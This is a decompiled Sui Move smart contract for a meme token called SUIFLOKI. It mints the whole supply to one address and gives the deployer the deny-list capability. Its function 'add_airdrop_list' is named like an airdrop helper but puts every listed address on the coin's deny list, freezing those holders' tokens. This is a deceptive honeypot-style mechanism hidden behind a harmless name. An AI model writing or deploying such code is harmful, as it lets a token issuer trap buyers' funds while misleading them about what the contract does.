module 0x30629e37a1af9bfbbfcaee50cd940372f700f6d507e533bc866f744097a57f61::SUIFLOKI {
    struct SUIFLOKI has drop {
        dummy_field: bool,
    }

    entry fun add_airdrop_list(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIFLOKI>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_v2_contains_current_epoch<SUIFLOKI>(arg0, v1, arg3)) {
                0x2::coin::deny_list_v2_add<SUIFLOKI>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    fun init(arg0: SUIFLOKI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIFLOKI>(arg0, 6, b"SUIFLOKI", b"FLOKI ON SUI", b"SUIFLOKI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/TOGPRn1.jpeg"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIFLOKI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIFLOKI>>(v1, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::Coin<SUIFLOKI>>(0x2::coin::mint<SUIFLOKI>(&mut v3, 1000000000000000, arg1), @0x7b3c5d549871784c7a9aaf06970698b9c7a7acaf23171d6f1f0de4094176225b);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SUIFLOKI>>(v3);
    }

    // decompiled from Move bytecode v6
}

